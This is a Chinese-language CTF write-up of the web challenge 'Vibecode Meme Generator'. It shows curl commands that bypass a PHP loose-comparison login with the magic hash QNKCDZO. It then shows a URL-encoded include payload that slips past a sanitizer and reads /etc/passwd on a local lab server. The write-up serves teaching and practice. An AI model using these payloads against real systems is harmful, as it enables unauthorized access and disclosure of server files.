# Vibecode Meme Generator

> **分类：** Web · **赛事：** KubSTU CTF 2026 Autumn · **难度：** High

## 📌 题目

页面上有一个带提示的「Lab sign-in」表单，通向一个 Meme Studio。需要绕过一个使用松散比较（loose comparison）的 PHP 登录（通过 magic hash 实现 type juggling），然后击败一个遗留的模板 include 指令的清洗器，从服务器上读取一个文件并拿到 flag。

## 🏁 解题思路

### 1. Lab sign-in

页面上有一个 Lab sign-in 表单和一个提示：

> The old login verifier compares results, not types. Inspect the request.

玩家打开 DevTools → Network，看到：

```http
POST /login.php
Content-Type: application/x-www-form-urlencoded
```

### 2. 对 login 做 Type Juggling

普通数据得到 `401 Unauthorized`。

关于 types 的提示指向 PHP loose comparison 和 magic hash。

已知的字符串：

```text
QNKCDZO
```

其 MD5 为：

```text
0e830400451993494058024219903391
```

服务器确实使用了一个 PHP 校验：

```php
md5($password) == $hash
```

因此我们发送：

```text
username=admin&password=QNKCDZO
```

通过 curl：

```bash
curl -i -c cookies.txt \
  -d 'username=admin&password=QNKCDZO' \
  http://localhost:8080/login.php
```

响应：

```http
302 Found
Location: /studio
Set-Cookie: capybara_session=admin; Path=/; HttpOnly
```

务必保留这个 cookie。

### 3. Meme Studio

跳转到 `/studio` 之后，玩家看到一个表单：

- Caption；
- Template；
- Render meme。

提示：

> The renderer supports a legacy include directive. Input is cleaned before the template engine expands it. The two stages do not see exactly the same string.

该表单提交：

```http
POST /render.php
Content-Type: application/x-www-form-urlencoded
```

### 4. 检查过滤器

普通的 `classic` 模板能用。

如果发送：

```text
[[include:/etc/passwd]]
```

服务器会回复 `Unknown template`，因为清洗会移除：

```text
..
/
\\
etc
passwd
```

### 5. 绕过清洗

过滤是在 URL 解码之前执行的。因此我们不仅对斜杠编码，还对过滤器按字面查找的那些字母也进行编码：

```text
%5B%5Binclude:%2F%65%74%63%2F%70%61%73%73%77%64%5D%5D
```

解码之后它变成：

```text
[[include:/etc/passwd]]
```

命令：

```bash
curl -i -b cookies.txt \
  -d 'caption=capybara&template=%5B%5Binclude:%2F%65%74%63%2F%70%61%73%73%77%64%5D%5D' \
  http://localhost:8080/render.php
```

服务器返回 `200 OK`、`/etc/passwd` 的内容以及 flag：

```text
KubSTU{capybara_types_and_templates}
```

**Flag:** `KubSTU{capybara_types_and_templates}`
